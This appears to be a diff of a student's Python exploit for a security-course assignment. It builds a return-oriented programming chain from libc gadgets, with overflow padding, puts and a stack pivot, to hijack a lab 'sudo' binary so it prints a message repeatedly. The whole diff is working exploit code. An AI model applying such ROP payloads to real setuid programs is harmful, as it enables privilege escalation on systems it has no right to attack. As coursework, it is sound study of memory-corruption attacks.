@@ -11,9 +11,10 @@ PATH_TO_SUDO = './sudo'
 LIBC_DUMP_PATH = './libc.bin'
 ID="325551448"
 
-POP_EBX = 'pop ebx'
-CALL_EBX = 'call ebx'
-SUB_ESP_4 = 'dec esp;' * 4
+POP_EBP = "pop ebp"
+POP_ESI = "pop esi"
+POP_ESP = "pop esp"
+
 
 def get_string(student_id):
     return 'Take me (%s) to your leader!' % student_id
@@ -42,20 +43,24 @@ def get_arg() -> bytes:
          The bytes of the password argument.
     """
     message = get_string(ID)
-    try:
-        search = GadgetSearch(LIBC_DUMP_PATH)
-        addr_rop_chain_part_1 = search.find(POP_EBX)
-        addr_rop_chain_part_2 = search.find_format(CALL_EBX)
-        addr_rop_chain_part_3 = search.find(SUB_ESP_4)
-        print(message)
-        print(addr_rop_chain_part_1)
-        print(addr_rop_chain_part_2)
-        print(addr_rop_chain_part_3)
-    except Exception as e:
-        print(e)
-
-    encoded_payload = ("A" * (0x8E - 11) + "B" * 4).encode('latin1') + addresses.address_to_bytes(addr_rop_chain_part1) + addresses.address_to_bytes(addresses.PUTS) + addresses.address_to_bytes(addr_rop_chain_part2) + addresses.address_to_bytes(message) + addresses.address_to_bytes(addr_rop_chain_part3)
-
+    search = GadgetSearch(LIBC_DUMP_PATH)
+    # padding then assign ebp to the address of puts so that
+    # inside the function it will rewrite the address in the stack
+    # in the overwriting and adds the address for puts and the 
+    # advance esp and the message and the repeat esp
+    rop_chain = []
+    rop_chain.append(search.find(POP_EBP))
+    rop_chain.append(addresses.PUTS)
+    rop_chain.append(addresses.PUTS)
+    rop_chain.append(search.find(POP_ESI))
+    rop_chain.append(addresses.MESSAGE_ADDR)
+    rop_chain.append(search.find(POP_ESP))
+    rop_chain.append(addresses.REPEATED_ROP_CHAIN_ADDR)
+    encoded_payload = ("A" * (0x8E - 11) + "B" * 4).encode('latin1')
+    for rop_chain_part in rop_chain:
+        encoded_payload += addresses.address_to_bytes(rop_chain_part)
+    encoded_payload += message.encode('latin1')
+    return encoded_payload
 
 def main(argv):
     # WARNING: DON'T EDIT THIS FUNCTION!
